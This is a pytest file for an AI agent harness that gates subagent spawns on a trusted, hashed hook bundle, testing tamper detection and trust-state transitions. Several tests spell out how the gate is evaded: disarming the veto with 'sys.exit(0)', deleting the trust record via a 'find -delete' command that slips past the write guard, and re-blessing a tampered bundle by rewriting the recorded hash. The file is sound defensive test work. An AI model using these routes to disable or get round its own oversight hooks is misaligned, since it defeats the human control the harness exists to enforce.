    assert fresh["capabilities"]["hook_trust"] == "unverified"


def test_doctor_does_not_report_unknown_for_what_it_has_read(tmp_path):
    """One report contradicted itself in two lines: `hook_bundle_hash: unknown` beside
    `hook_trust: verified — the installed bundle matches the trusted hash`. And spec II.4 names
    `specialists` among doctor's fields; it was absent entirely, not even as `unknown`."""
    root, state = doctor_project(tmp_path, wired=ALL_WIRED,
                                 kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    os.makedirs(os.path.join(root, ".claude", "agents"), exist_ok=True)
    write(os.path.join(root, ".claude", "agents", "backend-developer.md"), "---\n")
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    result = report.doctor(state)
    assert result["hook_bundle_hash"] != "unknown"
    assert result["trust_status"] == result["capabilities"]["hook_trust"]
    assert result["specialists"] == ["backend-developer"]


def test_a_bundle_changed_after_trust_is_still_visible_in_the_report(tmp_path):
    """THE OBSERVATION SURVIVES THE CAPABILITY BEING PULLED DOWN — a regression, fixed.

    `hook_trust` is held at `unverified` by a shipped `known_hole` whatever the hashes say, which
    is honest: the recorder is forgeable by anyone who can run scripts. But that made the report
    identical for a clean project and one whose spawn veto had been replaced by `sys.exit(0)` after
    trust was recorded. Every typed field — capabilities, trust_status, known_holes, enforcement
    and both blocker lists — came out the same, so no consumer could branch on the difference. A
    measurement with two outcomes had been collapsed into a constant.

    Both halves are asserted here, and the first is asserted on purpose: the capability MUST stay
    down (that is the enumeration's contract), which is exactly why the measurement needs a field
    of its own."""
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    trusted = {"state": "active", "hook_bundle_hash": "AUTO"}
    _clean_root, clean_state = doctor_project(tmp_path / "clean", wired=ALL_WIRED,
                                              kit_state=trusted)
    clean = report.doctor(clean_state)
    root, state = doctor_project(tmp_path / "tampered", wired=ALL_WIRED, kit_state=trusted)
    write(os.path.join(root, ".claude", "hooks", "gate_dispatch.py"),
          "import sys\nsys.exit(0)\n")   # the veto disarmed AFTER the bundle was recorded
    tampered = report.doctor(state)

    assert tampered["capabilities"] == clean["capabilities"], (
        "the enumeration must keep pulling `hook_trust` down — if this ever flips, the capability "
        "has stopped being a `known_hole` and this test should be reconsidered, not deleted")
    assert tampered["enforcement_blockers"] == clean["enforcement_blockers"]
    # ...and the difference is now typed, not buried in prose.
    assert clean["bundle_matches_recorded"] is True
    assert tampered["bundle_matches_recorded"] is False
    assert tampered["recorded_hook_bundle_hash"] == clean["hook_bundle_hash"]
    assert tampered["hook_bundle_hash"] != tampered["recorded_hook_bundle_hash"]
    changed = [f for f in tampered["installation_errors"]
               if f["item"] == ".claude/kit_state.json"]
    assert len(changed) == 1, tampered["installation_errors"]
    assert tampered["hook_bundle_hash"][:12] in changed[0]["message"]
    assert not [f for f in clean["installation_errors"]
                if f["item"] == ".claude/kit_state.json"]
    # The one thing that DID differ before this field existed was free text, which is why the
    # regression was easy to miss and why it did not count: nothing parses a reason string.
    assert (tampered["capability_reasons"]["hook_trust"]
            != clean["capability_reasons"]["hook_trust"])
    # ...and because it is an installation error, `python scripts/harness.py doctor` now EXITS NONZERO over a bundle
    # that changed after it was trusted, instead of printing an identical blob and exiting 0.
    proc = subprocess.run(
        [sys.executable, "-c",
         "import sys; sys.path.insert(0, %r); from kernel.cli import main; "
         "sys.exit(main(['--root', %r, 'doctor']))"
         % (TEAM_KITS, os.path.join(root, "project_memory"))],
        capture_output=True, text=True)
    assert proc.returncode == 1, proc.stdout[-400:] + proc.stderr[-400:]
    assert "[INSTALLATION] .claude/kit_state.json" in proc.stderr, proc.stderr


def test_the_bundle_measurement_says_nothing_when_there_is_nothing_to_compare(tmp_path):
    """`null` is a third answer and must not decay into `false`. A project that never ran a
    scaffold has recorded no hash; reporting `bundle_matches_recorded: false` there would accuse an
    untouched installation of the tampering the field exists to name."""
    virgin = doctor_of(tmp_path / "virgin", wired=ALL_WIRED)
    assert virgin["recorded_hook_bundle_hash"] is None
    assert virgin["bundle_matches_recorded"] is None
    assert not [f for f in virgin["installation_errors"]
                if f["item"] == ".claude/kit_state.json"]


def test_an_unconfirmed_hook_bundle_is_not_trusted(tmp_path):
    """spec II.8: a changed bundle needs /hooks confirmation and exactly one new session."""
    pending = doctor_of(tmp_path, wired=ALL_WIRED,
                        kit_state={"state": "hooks_trust_required", "hook_bundle_hash": "AUTO"})
    assert pending["capabilities"]["hook_trust"] == "unverified"
    assert pending["enforcement"] == "audited"


def _run_trust_hook(repo, kit="dev-team"):
    """Run the SessionStart trust hook exactly as a provider would, and return its exit code."""
    hook = os.path.join(TEAM_KITS, kit, "hooks", "kit_trust_state.py")
    proc = subprocess.run([sys.executable, hook], input=json.dumps({"cwd": str(repo)}),
                          capture_output=True, text=True, cwd=str(repo))
    return proc


def _scaffolded_bundle(repo, kit="dev-team"):
    """A repo with an installed hook bundle and the kit_state the scaffold would have written.

    The WHOLE kit bundle, not a handful of helpers: `write_kit_state.py` refuses to record trust
    for a bundle that is not the kit's, which is what stops an agent from laundering a tampered
    hook by re-running the recorder. A fixture that installed five files would be testing a bundle
    no scaffold produces.

    OUT OF A RE-STAMPED COPY, which is the difference between this fixture and the one that stood
    here. Running the real recorder against the real `team-kits/` made every test that needs an
    installed bundle depend on somebody having run `bump_kit_version.py` — the recorder's FIRST
    check is that the kit still hashes to its own VERSION, so editing any kit file dropped a dozen
    tests at once with "does not hash to the `content:` in its own VERSION". That message is true
    and about something else entirely, and while it was on screen those dozen tests were asserting
    nothing about what they were written for. `_restamped_staging` stamps its own copy, so the only
    question left in these tests is the one they ask.
    """
    staging = _restamped_staging(pathlib.Path(str(repo)).parent)
    proc = _install_from(staging, pathlib.Path(str(repo)), kit)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    return os.path.join(str(repo), ".claude", "hooks")


def _kit_state(repo):
    with open(os.path.join(str(repo), ".claude", "kit_state.json"), encoding="utf-8") as handle:
        return json.load(handle)


def test_the_scaffold_records_the_bundle_it_installed(tmp_path):
    """BUG-10, second half. `hook_trust` compares the installed bundle against the hash the
    project recorded — and NOTHING had ever written that record, in any scaffold, on any project.
    The comparison had no counterpart, so the capability could not pass, and `enforcement: hard`
    was unreachable for a reason no user could act on."""
    repo = tmp_path / "repo"
    _scaffolded_bundle(repo)
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import hook_bundle_hash
    state = _kit_state(repo)
    assert state["hook_bundle_hash"] == hook_bundle_hash(str(repo / ".claude"))
    assert state["kit"] == "dev-team"
    # ...but NOT `active`: the hooks it just installed are not running in the session that ran the
    # scaffold, and claiming they are is the exact "reports enforcement that is not in effect"
    # failure the capability matrix exists to prevent.
    assert state["state"] == "restart_required"


def test_a_session_start_is_what_promotes_the_bundle_to_trusted(tmp_path):
    """The evidence for `active` is that a hook RAN. Nothing else can establish it: a scaffold
    knows what it wrote to disk, not whether the provider loaded it."""
    repo = tmp_path / "repo"
    _scaffolded_bundle(repo)
    assert _kit_state(repo)["state"] == "restart_required"
    proc = _run_trust_hook(repo)
    assert proc.returncode == 0, proc.stderr
    assert _kit_state(repo)["state"] == "active"


def test_a_changed_bundle_falls_back_to_needing_trust(tmp_path):
    """spec II.8: a changed hash forces /hooks confirmation. Editing a hook is the single most
    valuable thing an agent could do to this repo, so the transition must be automatic and must
    survive the file already being `active`."""
    repo = tmp_path / "repo"
    hooks = _scaffolded_bundle(repo)
    _run_trust_hook(repo)
    assert _kit_state(repo)["state"] == "active"
    write(os.path.join(hooks, "_audit.py"), "# tampered\n")
    proc = _run_trust_hook(repo)
    assert proc.returncode == 0, proc.stderr
    state = _kit_state(repo)
    assert state["state"] == "hooks_trust_required"
    assert "HOOK BUNDLE CHANGED" in proc.stdout
    # and doctor must agree, since that is the whole point of recording it
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    trusted, why = report._hook_bundle_trust(str(repo))
    assert trusted is False, why


def test_a_spawn_is_refused_while_the_bundle_is_not_the_one_the_project_trusts(tmp_path):
    """Parity row 54: the trust record was WRITTEN by two producers and read by no authorisation.

    Measured 2026-08-01 before this, over four trust states with one identical spawn payload:
    four identical verdicts with identical reasons. `kit_state.json` was read by `kernel/report.py`
    (the doctor's `hook_trust` capability) and by `guard_harness_selfmod` (its write-protection
    list), and by nothing that decides whether a specialist may start — so a project could hand a
    child a task's `allowed_scope` on a bundle it had never vouched for.

    THE ABLATION IS THE BUNDLE AND NOTHING ELSE. One repo, one lease, one payload; the only thing
    varied between the two runs is one byte in an installed hook, and it is restored in place.
    What makes the difference in verdict a fact about the BUNDLE and not about the lease is the
    stderr assertion — `_refuse_untrusted_bundle` runs before the lease is even looked at, so a
    generic rc 2 would be satisfied by any refusal, and only the trust wording can be. An earlier
    version of this paragraph credited the ORDER of the two runs for that, which is wrong: the
    order is only the order of these statements and enforces nothing.
    """
    pytest.importorskip("yaml")
    repo = tmp_path / "repo"
    hooks = _scaffolded_bundle(repo)
    assert _kit_state(repo)["state"] == "restart_required"
    _state, _task, header = dispatched_repo(repo)
    payload = spawn_payload(repo, header)

    victim = os.path.join(hooks, "_audit.py")
    with open(victim, "rb") as handle:
        original = handle.read()
    with open(victim, "ab") as handle:
        handle.write(b"\n# tampered\n")
    refused = run_dispatch(repo, payload)
    assert refused.returncode == 2, refused.stdout + refused.stderr
    assert "is not the one this project trusts" in refused.stderr, refused.stderr

    with open(victim, "wb") as handle:
        handle.write(original)
    allowed = run_dispatch(repo, payload)
    assert allowed.returncode == 0, allowed.stdout + allowed.stderr


def test_a_stray_pyc_stops_delegation_and_removing_it_is_the_way_back(tmp_path):
    """The escalation the trust gate introduced, measured because the constitutions now claim it.

    Bytecode is inside the MEASURED bundle on purpose (`kernel/hashing.py`: `.claude/hooks` is
    `sys.path[0]`, so a bare `yaml.pyc` there owns every gate's parser). Before parity row 54 a
    cached `.pyc` cost a SessionStart nag; now it is a total stop on delegation — and that is not
    hypothetical, `hashing.py` records a release in which `doctor` itself cached eleven of them
    into `.claude/kernel`.

    So the way out is measured beside it, and it is the cheap one rather than a re-scaffold:
    bytecode is not part of what the scaffold installs, so removing the `__pycache__` directory
    restores the recorded hash by itself. A constitution that named the escalation without a way
    out would be an alarm nobody can act on.
    """
    pytest.importorskip("yaml")
    repo = tmp_path / "repo"
    _scaffolded_bundle(repo)
    _state, _task, header = dispatched_repo(repo)
    payload = spawn_payload(repo, header)

    cache = os.path.join(str(repo), ".claude", "kernel", "__pycache__")
    write(os.path.join(cache, "report.cpython-313.pyc"), "not really bytecode\n")
    refused = run_dispatch(repo, payload)
    assert refused.returncode == 2, refused.stdout + refused.stderr
    assert "is not the one this project trusts" in refused.stderr, refused.stderr

    shutil.rmtree(cache)
    assert run_dispatch(repo, payload).returncode == 0


def test_the_state_a_fresh_scaffold_leaves_behind_still_permits_delegation(tmp_path):
    """The half that keeps the gate above from being "anything but active blocks".

    `restart_required` is what `write_kit_state` records on EVERY scaffold, and the only thing
    that clears it is `kit_trust_state` — a SessionStart COMFORT hook that fails open by design.
    Blocking on it would mean a project whose SessionStart never ran, or whose comfort hook
    somebody removed, could never delegate again: one fail-open hook's absence turned into a
    total stop. The fixture above already delegates in that state; here it is the assertion
    rather than a side effect, and the `active` case is measured beside it so the pair says the
    gate keys off the HASH and not off the name.
    """
    pytest.importorskip("yaml")
    repo = tmp_path / "repo"
    _scaffolded_bundle(repo)
    _state, _task, header = dispatched_repo(repo)
    assert _kit_state(repo)["state"] == "restart_required"
    assert run_dispatch(repo, spawn_payload(repo, header)).returncode == 0

    _run_trust_hook(repo)
    assert _kit_state(repo)["state"] == "active"
    _state2, _task2, header2 = dispatched_repo(     # a second PR + a fresh lease
        repo, allowed_scope=["services/"], expected_outputs=["services/x.py"])
    assert run_dispatch(repo, spawn_payload(repo, header2)).returncode == 0


# -- the trust message must name a remedy that LEAVES the state ---------------

def powershell_or_skip():
    """The Windows PowerShell this host offers for a `.ps1` launcher -- or an honest skip.

    ASKED FOR, never assumed. `powershell` is the interpreter every shipped instruction hands
    `scaffold_team.ps1` to; a host without it cannot run that launcher at all, and the three sites
    served here reported a FileNotFoundError as if it were a defect of the harness -- the hosted
    ubuntu leg, which carries `pwsh` (a different product, and not the one the instructions name)
    and no `powershell` (BUG-0069).

    THIS IS NOT THE ONLY WAY THAT QUESTION IS ASKED IN THIS SUITE, and claiming it was would be an
    alarm as false as a reassurance: the older `.ps1` sites carry a `shutil.which("powershell")`
    or `os.name` clause of their own, in the test or in its callers, and none of them mis-reports.
    What has to hold is that the question is asked SOMEWHERE on the way to the launch, by any of
    those means -- `test_repo_hygiene.test_no_powershell_launch_in_this_suite_runs_without_asking
    _the_host_for_one` is the sweep that holds it, over all of `tools/`.
    """
    launcher = shutil.which("powershell")
    if launcher is None:
        pytest.skip("no Windows PowerShell on this host, so the .ps1 launcher this test drives "
                    "cannot be run here at all")
    return launcher


def _run_real_scaffold(home, repo, team="dev-team"):
    """The installer, run the way a user runs it: from the project root, out of `~/.claude`."""
    launcher = powershell_or_skip()
    env = dict(os.environ, USERPROFILE=str(home), HOME=str(home))
    return subprocess.run(
        [launcher, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File",
         str(pathlib.Path(str(home)) / ".claude" / "team-kits" / "scaffold_team.ps1"),
         "-Team", team],
        cwd=str(repo), capture_output=True, text=True, env=env, timeout=900)


def _perform(message, home, repo):
    """Do what `message` asks for, in the order it asks, and report which steps were performed.

    THE PROSE IS EXECUTED, not searched. There are exactly two things anyone can DO to a stuck
    project — start a session (the provider's act) and run the installer (the only writer of the
    trust record) — so those are the two the harness can carry out on a message's behalf. A step
    a message names and this cannot perform (`/hooks` is a human review) is simply not performed,
    which is the whole point: a remedy that reaches `active` only through an unexecutable step
    reaches it here not at all.
    """
    doable = {"session": (re.compile(r"new session", re.IGNORECASE),
                          lambda: _run_trust_hook(repo)),
              "scaffold": (re.compile(r"scaffold", re.IGNORECASE),
                           lambda: _run_real_scaffold(home, repo))}
    found = sorted((match.start(), name, action)
                   for name, (pattern, action) in doable.items()
                   for match in [pattern.search(message)] if match)
    for _at, _name, action in found:
        action()
    return [name for _at, name, _action in found]


def _the_store_this_project_was_installed_from(monkeypatch, home):
    """Point the RUNNING home at the fixture's store, for the two tests that really scaffold.

    Since DEC-0078 (4) a lease reads the kit's `ladder.yaml` out of the store the running home
    directory names (`dispatch.kit_installation`), so a fixture that installs a project from
    `tmp_path/home` and then mints a lease with the developer's own `~/.claude` still in the
    environment asks the WRONG store and is refused -- measured 2026-09-05 on exactly these two
    tests. Every other user of `dispatched_repo` builds a project with no scaffold record at all
    and needs no store; these two are the ones that have one.
    """
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))


def test_the_trust_message_names_a_remedy_that_actually_leaves_the_state(tmp_path, monkeypatch):
    """B1: the SessionStart message promised an exit the code does not build.

    It said "open /hooks, check what changed, and start one new session". `/hooks` writes no
    `kit_state.json` and `transition()` never rewrites `hook_bundle_hash` — only the recorder the
    scaffold runs does — so a project that followed the sentence literally stayed
    `hooks_trust_required` for ever, and with it every specialist spawn stayed refused.

    MEASURED, not reasoned: the trigger is the one a reviewer hit in a real lifecycle run — a
    python process that imported `.claude/kernel` without `-B` and left a `__pycache__` inside the
    hashed bundle. Then the message this hook actually PRINTS is handed to `_perform`, which
    carries out the steps it names. The assertion is on the state afterwards, so nothing here is
    satisfied by a word appearing in a string: with the old sentence the only executable step is a
    restart, and a restart leaves the project exactly where it was.

    The spawn is measured on both sides of it, because the state's cost is the thing worth
    reporting — a stuck project cannot delegate at all.
    """
    pytest.importorskip("yaml")
    home, repo = tmp_path / "home", tmp_path / "repo"
    staging = _restamped_staging(tmp_path)
    os.makedirs(str(home / ".claude"), exist_ok=True)
    shutil.copytree(str(staging), str(home / ".claude" / "team-kits"), dirs_exist_ok=True)
    os.makedirs(str(repo / "project_memory"), exist_ok=True)
    subprocess.run(["git", "init", "-q", str(repo)], capture_output=True)
    write(str(repo / "project_memory" / "project_config.yaml"),
          "project:\n  name: trust-remedy\n  preset: solo\nproviders: [claude]\n")
    scaffolded = _run_real_scaffold(home, repo)
    assert scaffolded.returncode == 0, scaffolded.stdout[-3000:] + scaffolded.stderr[-2000:]
    _run_trust_hook(repo)
    assert _kit_state(repo)["state"] == "active"

    # THE SUITE'S OWN BYTECODE SETTINGS ARE REMOVED, not inherited: `conftest` exports
    # `PYTHONPYCACHEPREFIX` so the tests never litter a tree, and a subprocess that inherits it
    # caches nothing wherever it runs — the trigger would then be measuring pytest's environment
    # instead of the reported case. A role's shell has neither variable, so neither may decide
    # anything here. (`tools/test_hooks.py` strips the same three for the same reason.)
    plain = {k: v for k, v in os.environ.items()
             if k not in ("PYTHONPATH", "PYTHONPYCACHEPREFIX", "PYTHONDONTWRITEBYTECODE")}
    cached = subprocess.run(
        [sys.executable, "-c", "import sys; sys.path.insert(0, %r); from kernel import hashing; "
                               "assert hashing" % str(repo / ".claude")],
        capture_output=True, text=True, cwd=str(repo), env=plain, timeout=120)
    assert cached.returncode == 0, cached.stderr
    assert (repo / ".claude" / "kernel" / "__pycache__").is_dir(), (
        "the trigger did not cache anything, so this test is not measuring the reported case")

    reported = _run_trust_hook(repo)
    assert _kit_state(repo)["state"] == "hooks_trust_required"
    message = json.loads(reported.stdout)["hookSpecificOutput"]["additionalContext"]
    _the_store_this_project_was_installed_from(monkeypatch, home)
    _state, _task, header = dispatched_repo(repo)
    stopped = run_dispatch(repo, spawn_payload(repo, header))
    assert stopped.returncode == 2 and "is not the one this project trusts" in stopped.stderr

    performed = _perform(message, home, repo)
    assert performed, "the message asks for nothing this harness can carry out"
    assert _kit_state(repo)["state"] != "hooks_trust_required", (
        "doing what the message asks for (%s) left the project in hooks_trust_required — the "
        "message promises a way out that the code does not build.\n%s" % (performed, message))
    freed = run_dispatch(repo, spawn_payload(repo, header))
    assert "is not the one this project trusts" not in freed.stderr, freed.stderr


def _really_scaffolded(tmp_path, team="dev-team", name="lead-identity"):
    """A project the REAL installer produced, plus the home it was installed from.

    The whole point of the test below is that the fixture must not be able to decide the answer:
    the binding it measures (`settings.json` `agent:`) is something the SCAFFOLD writes.
    """
    home, repo = tmp_path / "home", tmp_path / "repo"
    staging = _restamped_staging(tmp_path)
    os.makedirs(str(home / ".claude"), exist_ok=True)
    shutil.copytree(str(staging), str(home / ".claude" / "team-kits"), dirs_exist_ok=True)
    os.makedirs(str(repo / "project_memory"), exist_ok=True)
    subprocess.run(["git", "init", "-q", str(repo)], capture_output=True)
    write(str(repo / "project_memory" / "project_config.yaml"),
          "project:\n  name: %s\n  preset: solo\nproviders: [claude]\n" % name)
    scaffolded = _run_real_scaffold(home, repo, team=team)
    assert scaffolded.returncode == 0, scaffolded.stdout[-3000:] + scaffolded.stderr[-2000:]
    # ...AND THE RESTART THE INSTALLER ASKS FOR, walked through the hook that owns it. A scaffold
    # ends by writing `.claude/HANDOVER_PENDING`, and since TSK-0067 the kit's own `gate_dispatch`
    # refuses a specialist spawn while it stands (the global handover guard always did). A project
    # that delegates is therefore one that has STARTED A SESSION since the install, and the honest
    # way to put a fixture in that state is to run `clear_handover_marker` with the source only a
    # real process start carries -- not to delete the file behind the gate's back.
    restarted = subprocess.run(
        [sys.executable, "-B", os.path.join(str(repo), ".claude", "hooks",
                                            "clear_handover_marker.py")],
        input=json.dumps({"hook_event_name": "SessionStart", "source": "startup",
                          "cwd": str(repo)}),
        capture_output=True, text=True, cwd=str(repo), timeout=120,
        env=dict(os.environ, CLAUDE_PROJECT_DIR=str(repo)))
    assert restarted.returncode == 0, restarted.stderr
    assert not os.path.exists(str(repo / ".claude" / "HANDOVER_PENDING")), (
        "the SessionStart hook did not clear the installer's handover marker, so this fixture is "
        "not a project that has restarted")
    return home, repo


def test_the_lead_of_a_scaffolded_project_is_not_read_as_its_own_subagent(tmp_path, monkeypatch):
    """F1: THE PREDICATE WAS MEASURED IN A PROJECT THAT BOUND NO SESSION AGENT.

    `_compat.calling_subagent` returned any agent name a payload carried, on a probe run in a
    scratch project outside any repo — where the session instance's payload really does carry
    neither field. Every SCAFFOLDED project binds one (`settings.json` `agent:`), and there the
    session instance's own payload carries `agent_type` = that role. So in every scaffolded
    project the lead was its own subagent: `guard_agent_spawn` refused every delegation and
    `gate_write_scope` rule 4 refused `create-task` and `dispatch`. Provenance for the payload
    shape: tools/provider_observations.json -> `agent_identity.correction_2026_08_04`.

    WHY THIS RUNS THE REAL INSTALLER instead of building a payload. The check that missed this
    measured the truth-value decision in both directions with payloads it wrote itself, and never
    saw one from a project with a binding — so the fixture agreed with the code about what a lead
    looks like. Here every name in the payload is READ OUT of the installed project: the lead from
    the settings the scaffold wrote, the specialist from the agent files it copied. A kit that
    bound a different role would be measured on that role.

    BOTH DIRECTIONS AND THE FORGERY, since the exemption is what is new:
      * the bound role in `agent_type` is the LEAD and delegates;
      * any other installed role in `agent_type` is a subagent and does not;
      * the bound role in `agent_id` is still a subagent — an id belongs to a spawn, so a payload
        that carries one is not the session instance whatever it spells.
    """
    pytest.importorskip("yaml")
    home, repo = _really_scaffolded(tmp_path)
    _the_store_this_project_was_installed_from(monkeypatch, home)
    claude = str(repo / ".claude")
    with open(os.path.join(claude, "settings.json"), encoding="utf-8") as fh:
        lead = json.load(fh)["agent"]
    installed = {os.path.splitext(os.path.basename(p))[0]
                 for p in globmodule.glob(os.path.join(claude, "agents", "*.md"))}
    specialists = sorted(installed - {lead})
    assert lead and specialists, (
        "the scaffold bound %r and installed %s — without both there is nothing to contrast"
        % (lead, sorted(installed)))

    state, task, header = dispatched_repo(repo)
    command = _registered_spawn_command(claude, repo)
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(repo))
    env.pop("HARNESS_KERNEL_PATH", None)          # the scaffolded project carries its own kernel

    def spawn(**identity):
        payload = dict(spawn_payload(repo, header, run_in_background=False), **identity)
        payload["tool_input"]["run_in_background"] = False
        return subprocess.run(command, input=json.dumps(payload), capture_output=True,
                              text=True, env=env, timeout=180)

    as_the_lead = spawn(agent_type=lead)
    assert _NOT_A_DELEGATOR not in as_the_lead.stderr, (
        "the session instance of a scaffolded project was refused as a subagent — with `agent:` "
        "bound, %r is what the lead's OWN payload carries, so this refuses every delegation the "
        "project can make:\n%s" % (lead, as_the_lead.stderr))
    assert _lease_of(state, task["id"]).get("dispatched_at"), (
        "the chain let the lead through and never spent the lease: %s" % as_the_lead.stderr)

    for role in specialists:
        refused = spawn(agent_type=role)
        assert refused.returncode == 2 and _NOT_A_DELEGATOR in refused.stderr, (
            role, refused.stdout + refused.stderr)
    forged = spawn(agent_id=lead)
    assert forged.returncode == 2 and _NOT_A_DELEGATOR in forged.stderr, (
        "an `agent_id` belongs to a SPAWN; naming the lead in one must buy nothing:\n%s"
        % forged.stderr)

    # ...and rule 4, the second caller, in the same installed project
    ordering = shell_payload(repo, "python scripts/harness.py create-task --type implementation")
    scope = os.path.join(claude, "hooks", "gate_write_scope.py")
    for identity, ordered in ((lead, False), (specialists[0], True)):
        result = subprocess.run([sys.executable, scope],
                                input=json.dumps(dict(ordering, agent_type=identity)),
                                capture_output=True, text=True, env=env, timeout=180)
        assert ("ORDERS work" in result.stderr) is ordered, (identity, result.stderr)


def test_the_scaffold_a_trust_refusal_names_is_a_step_the_session_cannot_take(tmp_path):
    """The claim both refusals now carry, pinned so it cannot rot in either direction.

    They say "ask the user to run it", and that sentence is only allowed to stand while the
    session really cannot: `gate_write_scope` refuses a write-capable command line that NAMES the
    enforcement layer, and the installers' documented invocations name `team-kits`. Measured
    2026-08-03 in all three kits.

    BOTH INSTALLERS, because four texts now carry the claim and they name two scripts between
    them: `kit_trust_state` and `gate_dispatch` send the reader to the scaffold, `kernel.report`'s
    installation error does the same, and `session_status`'s KIT UPDATE banner — the text with the
    largest readership in the kit — names `init_project_memory` beside it. A pin covering only the
    scaffold would leave half of the sentence a claim nothing checks.

    THE FAIL DIRECTION MATTERS BOTH WAYS. If a later change makes the installer runnable from a
    session, this test goes red and the sentence has to come out — a remedy that understates the
    session's reach sends the role to the user for nothing, which is the same defect as one that
    overstates it. And the `cd`-first spelling that slips past the gate is no counter-example: the
    scaffold installs into `pwd`, so a shell that changed directory first would scaffold the
    staging instead of the project.
    """
    dispatched_repo(tmp_path)
    invocations = [
        "bash ~/.claude/team-kits/scaffold_team.sh dev-team",
        'powershell -NoProfile -ExecutionPolicy Bypass -File '
        '"$env:USERPROFILE\\.claude\\team-kits\\scaffold_team.ps1" -Team dev-team',
        "bash ~/.claude/team-kits/init_project_memory.sh dev-team",
        'powershell -NoProfile -ExecutionPolicy Bypass -File '
        '"$env:USERPROFILE\\.claude\\team-kits\\init_project_memory.ps1" -Team dev-team',
    ]
    for kit in KITS:
        for command in invocations:
            result = run_scope(tmp_path, shell_payload(tmp_path, command), kit=kit)
            assert result.returncode == 2, (kit, command, result.stdout)


def test_a_project_with_no_trust_record_is_not_stopped_and_the_hole_is_named(tmp_path):
    """The deliberate non-closure, asserted so it stays a decision rather than becoming a belief.

    A repo that carries no `kit_state.json` has never had a trust measurement made about it —
    there is nothing to compare — so `_kernel.bundle_trust` reports no withdrawal and the spawn
    proceeds. The cost is that WRITING the record — deleting it or replacing it — disarms this
    gate.

    WHICH WRITES ARE ACTUALLY OPEN is measured here rather than asserted in prose, because the
    prose has been wrong twice: first in both directions ("no gate sees an `rm`"), then too narrow
    by speaking only of deletion. A shell pipeline that NAMES the enforcement layer is refused by
    `gate_write_scope`; what is open is the complement — a command line that names it nowhere.

    THE THIRD LEG IS THE ONE THAT MATTERS MOST, and it was missing while the texts described the
    hole as "the record can disappear": through that same complement a role can RE-BLESS a
    tampered bundle, and the gate then compares two values the guarded party chose. Measured
    below end to end — tamper, refuse, re-bless, pass — so the limit keeps the shape the
    constitutions give it. `kit_state.json` cannot move inside the hashed set; it holds that
    set's hash.
    """
    pytest.importorskip("yaml")
    repo = tmp_path / "repo"
    hooks = _scaffolded_bundle(repo)
    _state, _task, header = dispatched_repo(repo)

    def shell(command):
        payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": str(repo),
                   "tool_input": {"command": command}}
        env = dict(os.environ, CLAUDE_PROJECT_DIR=str(repo), HARNESS_KERNEL_PATH=TEAM_KITS)
        return subprocess.run(
            [sys.executable, os.path.join(TEAM_KITS, "dev-team", "hooks", "gate_write_scope.py")],
            input=json.dumps(payload), capture_output=True, text=True, env=env, timeout=120)

    named = shell("rm .claude/kit_state.json")
    assert named.returncode == 2, named.stdout + named.stderr
    assert "enforcement layer" in named.stderr, named.stderr
    assert shell("find . -name kit_state.json -delete").returncode == 0

    # LEG 3 — re-blessing, the half the texts used to leave out. Tamper first, confirm the gate
    # refuses, then rewrite the record with the hash OF THE TAMPERED BUNDLE and watch the refusal
    # disappear. Nothing here goes through `write_kit_state`, which is exactly the point: that
    # recorder re-copies the kit and refuses a modified bundle, and no gate forces a role to use
    # it.
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import hook_bundle_hash
    state_file = os.path.join(str(repo), ".claude", "kit_state.json")
    write(os.path.join(hooks, "_audit.py"), "# tampered beyond recognition\n")
    refused = run_dispatch(repo, spawn_payload(repo, header))
    assert refused.returncode == 2 and "is not the one this project trusts" in refused.stderr

    with open(state_file, encoding="utf-8") as handle:
        record = json.load(handle)
    record["hook_bundle_hash"] = hook_bundle_hash(os.path.join(str(repo), ".claude"))
    write(state_file, json.dumps(record))
    reblessed = run_dispatch(repo, spawn_payload(repo, header))
    assert "is not the one this project trusts" not in reblessed.stderr, (
        "re-blessing no longer works — the hole changed shape and the texts that describe it "
        "have to change with it")

    # LEG 2 — and with the record gone entirely, the same tampered bundle passes outright. A
    # FRESH lease: the run above got past the trust gate and CONSUMED the first one, so reusing
    # its header would fail on a spent claim and say nothing about trust.
    os.remove(state_file)
    _state2, _task2, header2 = dispatched_repo(
        repo, allowed_scope=["services/"], expected_outputs=["services/x.py"])
    assert run_dispatch(repo, spawn_payload(repo, header2)).returncode == 0

    kernel_bridge = load_kit_module(
        "kernel_bridge_under_test", os.path.join(TEAM_KITS, "dev-team", "hooks", "_kernel.py"))
    kernel_bridge.disarm()
    assert kernel_bridge.bundle_trust(str(repo)).withdrawn is False


def test_the_scaffold_installs_the_kernel_the_hooks_import(tmp_path):
    """Found while wiring the trust record, and larger than what it was found under.

    `_kernel.kernel_parents()` names `<repo>/.claude` as the FIRST candidate and documents why:
    "a project always runs the kernel its hook bundle was hashed against". NOTHING put a kernel
    there. So the documented first candidate never existed, and every scaffolded project fell
    through to `~/.claude/team-kits` — or, on any machine whose global staging predates the V2
    kernel, got `KernelUnavailable` from every integrity gate, which is fail-closed and therefore
    refuses the calls it was meant to authorise. Reproduced exactly that way.

    RUNS THE SCAFFOLD. The first version of this test grepped the script for `.claude/kernel` —
    and the explanatory COMMENT above the copy block contains that string, so deleting the copy
    itself left the test green. A delivery promise needs a delivery, not a mention.

    OUT OF A RE-STAMPED COPY, for the reason `_restamped_staging` gives: the scaffold ends in the
    trust recorder, whose first check is the kit's own stamp, so a raw copy of `team-kits/` made
    this test fail with "the scaffold failed and rolled back" whenever nobody had run
    `bump_kit_version.py` — a message pointing at the kernel copy, produced by an unbumped VERSION.
    The leftovers below are planted AFTER the re-stamp on purpose and change no stamp: they are
    exactly what `is_transient` excludes from what a kit CONTAINS, which is the claim this test
    then holds the scaffold to at the moment source becomes installation."""
    staging = _restamped_staging(tmp_path)
    # ...and no tool leftover arrives with it. The installed bundle is hashed with NOTHING excluded,
    # so `kit_hash` may leave leftovers out of what a kit CONTAINS only because no kit ships any —
    # this prune is what makes that true at the moment source becomes installation, and without it
    # a `.pyc` planted in a staging would ride in as an importable module on `sys.path[0]`. The
    # cache DIRECTORY is the same defect one level up: it was outside `kit_hash` and inside the
